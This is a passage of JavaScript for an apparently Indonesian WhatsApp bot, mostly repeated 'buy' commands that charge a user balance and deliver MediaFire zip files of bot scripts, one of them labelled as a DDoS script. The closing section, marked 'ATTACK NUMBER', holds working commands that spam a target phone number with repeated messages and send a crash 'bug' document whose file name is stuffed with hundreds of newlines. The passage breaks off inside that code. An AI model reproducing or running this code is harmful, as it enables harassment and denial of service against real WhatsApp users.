Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/pxnzy1l8a8oyxb7/Sc_v3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3subdo': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/q8bzkjtt4qk8fsc/Sc_v3_Subdo.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv4': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/y8po44xpgjqg1g8/ScCampuranV4.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv5': {
       if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/7i55w043gwd39i9/Sc+v5+Full+Otomatis.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6': {
       if (cekSaldo(sender,db_saldo) < 60000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp60.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 60000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/6el6pwjzu1dbn60/Sc%252Bv6.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6subdo': {
       if (cekSaldo(sender,db_saldo) < 70000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp70.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 70000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ivhjsn8calgpaak/Sc+v6.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7otp': {
       if (cekSaldo(sender,db_saldo) < 75000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp75.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 75000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fsvfy6ia24t2ctg/Sc+v7.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7addpm2': {
       if (cekSaldo(sender,db_saldo) < 85000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp85.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 85000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ucp2nsjzgm8fnzs/Sc+v7+Fitur+Addpm2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv8': {
       if (cekSaldo(sender,db_saldo) < 95000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp95.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 9.5000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/wgn9xu2plg46z75/Sc+Campuran+v8.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/jaxgd3mdrxjkszb/Sc_Jaga_Grup.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpushkontak': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv191': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/6kfjfrh6zdsh0yt/Sc+Hw+19+By+Rafathar+Offcial.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv192': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xgsig9ks6frk33f/Sc+Hw+19+Campuran.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv201': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ms5ku2ln12eejys/Hw+v20+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv202': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/r1ua56cc5gtiu4t/Hw+v20+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break               
                case 'buyschwv21': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/hkle716qtcnrs5f/Sc+Hw21+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv21noscan': {
       if (cekSaldo(sender,db_saldo) < 65000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp65.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 65000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/t4t9kboxbhmbosl/Sc+Hw21+No+Enc+No+Scan.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnoscan': {
       if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ysbnrwngzf74dp4/Sc+No+Scan.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscscan': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/oolon4sp4t5iupq/null.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
         case 'buyscpushautosave': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps1': {
       if (cekSaldo(sender,db_saldo) < 50000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp50.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 50000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/m15hcg29acbocu8/Cvps+x+cpanel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps2': {
       if (cekSaldo(sender,db_saldo) < 80000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp80.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 80000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/e82vlln6hgrb5eq/Cvps+x+cpanel+v2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv2': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yvedxy122ewg10e/Sc+Thema+Panel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/hannff11mbawc34/temaptero.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnowa': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/gzy6qhjk9tkv46z/Nowa.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscwebp': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/i5fgc58laqm1vp8/SC+BOT+WEBP.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buysctesmoni': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/0f0vjjdb6rtye1p/TESTIMONI.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscddos': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o4cbc7vejqujeo7/sc+ddos.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbukaenc': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/khn6afrmw39s1kk/Sc+Buka+No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buymodule': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/h931yeyrzkyr91e/node_modules.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpm2': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bj4ram64qu6j1ao/Sc+Pm2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "SanZ Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "SanZ Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb SanZ Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@SanZxyz1", 
"sourceUrl": "https://youtube.com/@SanZxyz1" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "Rafathar Bug🔥`", fileName: `Rafathar Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
